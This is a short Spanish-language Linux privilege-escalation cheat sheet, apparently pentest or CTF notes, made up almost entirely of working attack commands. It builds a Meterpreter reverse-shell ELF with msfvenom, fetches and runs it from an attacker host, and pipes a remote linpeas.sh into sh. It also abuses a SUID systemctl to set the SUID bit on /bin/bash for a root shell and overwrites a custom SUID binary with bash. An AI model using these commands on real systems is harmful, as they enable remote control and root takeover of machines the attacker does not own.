# PRIVESC LINUX — Enumeración, sudo y SUID

## Shell a Meterpreter
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f elf -o virus.elf
python3 -m http.server 80
# En víctima: wget http://<ATTACKER_IP>/virus.elf && chmod +x virus.elf && ./virus.elf
msfconsole -q -x "use multi/handler; set LHOST <LHOST>; set LPORT 4444; set PAYLOAD linux/x64/meterpreter/reverse_tcp; run"

# Upgrade shell → meterpreter
use shell_to_meterpreter
set session 1 && set lhost <LHOST> && run
```

## LinPEAS
```bash
python3 -m http.server 8080
wget http://<ATTACKER_IP>:8080/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
# O en memoria:
curl -L http://<ATTACKER_IP>/linpeas.sh | sh
```

## sudo -l (GTFOBins)
```bash
sudo -l
# Buscar NOPASSWD en https://gtfobins.github.io/
```

## Binarios SUID
```bash
find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null | grep '/bin'
```

### systemctl SUID → root
```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod u+s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF && /bin/systemctl enable --now $TF
bash -p
```

### SUID binario custom
```bash
file <FILE> && strings <FILE>
rm <BINARY> && cp /bin/bash <BINARY>
./<FILE>
```
